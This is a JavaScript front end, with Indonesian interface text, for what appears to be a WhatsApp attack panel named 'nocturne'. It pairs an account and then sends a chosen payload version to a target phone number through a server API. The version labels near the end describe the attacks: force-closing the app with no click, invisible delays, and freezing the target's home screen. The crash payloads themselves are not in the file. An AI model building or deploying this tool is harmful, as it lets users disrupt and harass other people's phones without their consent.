document.addEventListener('DOMContentLoaded', function() {
    initializeWhatsApp();
    checkConnectionStatus();    
    setInterval(checkConnectionStatus, 5000);
});

function initializeWhatsApp() {
    const connectBtn = document.getElementById('connectBtn');
    const sendBtn = document.getElementById('sendBtn');
    
    connectBtn.addEventListener('click', requestPairingCode);
    sendBtn.addEventListener('click', sendWhatsAppMessage);
    
    const targetInput = document.getElementById('targetNumber');
    targetInput.addEventListener('input', formatPhoneNumber);
}

async function requestPairingCode() {
    const phoneNumber = prompt('Masukkan nomor WhatsApp Anda untuk pairing (contoh: 628123456789):');
    
    if (!phoneNumber) {
        return;
    }
    
    const cleanNumber = phoneNumber.replace(/\D/g, '');
    if (cleanNumber.length < 10 || cleanNumber.length > 15) {
        showNotification('Format nomor telepon tidak valid', 'error');
        return;
    }
    
    const connectBtn = document.getElementById('connectBtn');
    const originalText = connectBtn.textContent;
    
    try {
        connectBtn.textContent = 'Generating Code...';
        connectBtn.disabled = true;
        
        const response = await fetch('/api/whatsapp/connect', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ phoneNumber: cleanNumber })
        });
        
        const result = await response.json();
        
        if (result.success) {
            showPairingCode(result.pairingCode, cleanNumber);
            showNotification('Kode pairing berhasil dibuat! Masukkan kode ke WhatsApp Anda.', 'success');
        } else {
            showNotification(result.message || 'Gagal membuat kode pairing', 'error');
        }
    } catch (error) {
        console.error('Pairing code error:', error);
        showNotification('Koneksi gagal. Periksa internet Anda.', 'error');
    } finally {
        connectBtn.textContent = originalText;
        connectBtn.disabled = false;
    }
}

function showPairingCode(code, phoneNumber) {
    const codeContainer = document.getElementById('codeContainer');
    const pairingCodeDisplay = document.getElementById('pairingCodeDisplay');
    
    pairingCodeDisplay.textContent = code;
    codeContainer.classList.remove('hidden');
}

function hidePairingCode() {
    const codeContainer = document.getElementById('codeContainer');
    codeContainer.classList.add('hidden');
}

async function checkConnectionStatus() {
    try {
        const response = await fetch('/api/whatsapp/status');
        const status = await response.json();
        
        const statusIndicator = document.getElementById('connectionStatus');
        const statusDot = statusIndicator.querySelector('.status-dot');
        const statusText = statusIndicator.querySelector('span');
        const connectBtn = document.getElementById('connectBtn');
        
        if (status.connected) {
            statusDot.className = 'status-dot online';
            statusText.textContent = `Connected (${status.phoneNumber || 'Unknown'})`;
            connectBtn.textContent = 'Reconnect';
            connectBtn.classList.remove('btn-primary');
            connectBtn.classList.add('btn-success');
            
            if (status.connected && !document.getElementById('codeContainer').classList.contains('hidden')) {
                hidePairingCode();
                showNotification('WhatsApp berhasil terhubung!', 'success');
            }
        } else {
            statusDot.className = 'status-dot offline';
            statusText.textContent = 'Disconnected';
            connectBtn.textContent = 'Connect WhatsApp';
            connectBtn.classList.remove('btn-success');
            connectBtn.classList.add('btn-primary');
        }
        
        document.getElementById('sendBtn').disabled = !status.connected;
        
    } catch (error) {
        console.error('Status check error:', error);
    }
}

async function sendWhatsAppMessage() {
    const targetNumber = document.getElementById('targetNumber').value.trim();
    const messageVersion = document.getElementById('messageVersion').value;
    
    if (!targetNumber) {
        showNotification('Nomor WhatsApp target harus diisi', 'error');
        return;
    }
    
    const cleanNumber = targetNumber.replace(/\D/g, '');
    if (cleanNumber.length < 10 || cleanNumber.length > 15) {
        showNotification('Format nomor WhatsApp tidak valid', 'error');
        return;
    }
    
    const sendBtn = document.getElementById('sendBtn');
    const originalText = sendBtn.textContent;
    
    try {
        sendBtn.textContent = 'Sending...';
        sendBtn.disabled = true;
        showLoading();
        
        const user = JSON.parse(localStorage.getItem('nocturne_user') || '{}');
        
        const response = await fetch('/api/whatsapp/send', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                target: targetNumber,
                version: messageVersion,
                message: '',
                userId: user.username || 'anonymous'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            showNotification(`Pesan ${messageVersion.toUpperCase()} berhasil dikirim ke ${targetNumber}`, 'success');
            
            document.getElementById('targetNumber').value = '';
            
            if (result.nextAvailable) {
                showRateLimit(result.nextAvailable);
            }
        } else {
            showNotification(result.message || 'Gagal mengirim pesan', 'error');
            
            if (result.nextAvailable) {
                showRateLimit(result.nextAvailable);
            }
        }
    } catch (error) {
        console.error('Send message error:', error);
        showNotification('Koneksi gagal. Periksa internet Anda.', 'error');
    } finally {
        sendBtn.textContent = originalText;
        sendBtn.disabled = false;
        hideLoading();
    }
}

function showRateLimit(nextAvailable) {
    const rateLimitInfo = document.getElementById('rateLimitInfo');
    const countdown = document.getElementById('countdown');
    
    rateLimitInfo.classList.remove('hidden');
    
    const updateCountdown = () => {
        const now = new Date();
        const next = new Date(nextAvailable);
        const diff = next - now;
        
        if (diff <= 0) {
            rateLimitInfo.classList.add('hidden');
            return;
        }
        
        const minutes = Math.floor(diff / 60000);
        const seconds = Math.floor((diff % 60000) / 1000);
        
        countdown.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
    };
    
    updateCountdown();
    const interval = setInterval(() => {
        updateCountdown();
        
        const now = new Date();
        const next = new Date(nextAvailable);
        if (now >= next) {
            clearInterval(interval);
            rateLimitInfo.classList.add('hidden');
        }
    }, 1000);
}

function formatPhoneNumber(event) {
    let value = event.target.value.replace(/\D/g, '');
    
    if (value.startsWith('08')) {
        value = '62' + value.substring(1);
    } else if (value.startsWith('8') && value.length > 8) {
        value = '62' + value;
    }
    
    event.target.value = value;
}

document.addEventListener('DOMContentLoaded', function() {
    const versionSelect = document.getElementById('messageVersion');
    
    if (versionSelect) {
        versionSelect.addEventListener('change', function() {
            const version = this.value;
            const descriptions = {
                v1: 'Force Close App - Crash No Click',
                v2: 'Delay Maker - Delay Invisble',
                v3: 'Freeze Home - Freeze Target'
            };
            
            const description = descriptions[version] || descriptions.v1;
            
            if (!document.querySelector('.version-help')) {
                const helpDiv = document.createElement('div');
                helpDiv.className = 'version-help';
                helpDiv.style.cssText = `
                    margin-top: 8px;
                    padding: 8px 12px;
                    background: #e8f0fe;
                    border-radius: 4px;
                    font-size: 12px;
                    color: #1a73e8;
                `;
                versionSelect.parentNode.appendChild(helpDiv);
            }
            
            document.querySelector('.version-help').textContent = description;
        });
        
        versionSelect.dispatchEvent(new Event('change'));
    }
});